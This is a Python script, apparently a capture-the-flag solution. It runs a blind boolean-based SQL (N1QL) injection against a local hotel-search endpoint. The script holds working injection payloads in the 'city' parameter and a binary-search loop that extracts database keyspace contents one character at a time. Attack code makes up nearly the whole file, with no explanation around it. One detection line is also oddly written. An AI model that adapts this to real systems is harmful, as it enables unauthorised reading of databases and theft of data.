import requests
from urllib.parse import urlencode, quote

BASE_URL = "http://localhost:3000/hotels/search"

# http://localhost:3000/hotels/search?city=' OR '{' = SUBSTR(ENCODE_JSON((SELECT * FROM system:keyspaces ORDER BY id)), 1, 1) -- -&q=Inn

# http://localhost:3000/hotels/search?city=San%20Francisco%27%20AND%20%27A%27%20=%20SUBSTR(ENCODE_JSON((SELECT%20*%20FROM%20system:keyspaces%20ORDER%20BY%20id)),%201,%201)%20--%20-&q=Inn


# params = {
#     "city": "' OR '{' = SUBSTR(ENCODE_JSON((SELECT * FROM system:keyspaces ORDER BY id)), 1, 1) -- -",
#     "q": "Inn"
# }

# # spaces -> %20, bukan '+'
# qs = urlencode(params, quote_via=quote, safe="")   # safe="" biar semua di-encode sesuai kebutuhan
# url = f"{BASE_URL}?{qs}"

# r = requests.get(url, timeout=5)
# r.raise_for_status()

# print("final url:", r.request.url)

# # perbaiki juga logika res-mu (yang sebelumnya selalu cek "\"rows\":[]")


# print("is_failure:", is_failure, "is_empty:", is_empty, "res:", res)
# print(txt)

def sqli(pos, mid):
    xchr = chr(mid)
    params = {
        "city": "' OR SUBSTR(ENCODE_JSON((SELECT * FROM system:keyspaces ORDER BY id)), %i, 1) > '%s' -- -" % (pos, xchr),
        "q": "Inn"
    }
    r = requests.get(BASE_URL, params=params, timeout=5)
    r.raise_for_status()
    txt = r.text
    is_failure = "parsing failure" in txt.lower() in txt.lower()
    is_empty = "\"rows\":[]" in txt
    res = not (is_failure or is_empty)
    if(res):
        print(xchr)
    return res

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
            print(lo)
        else:
            hi = mid - 1
    # print(lo)
    return chr(lo)

flag = ''
for i in range(1, 15):
    flag += get_char(i)
    print(flag)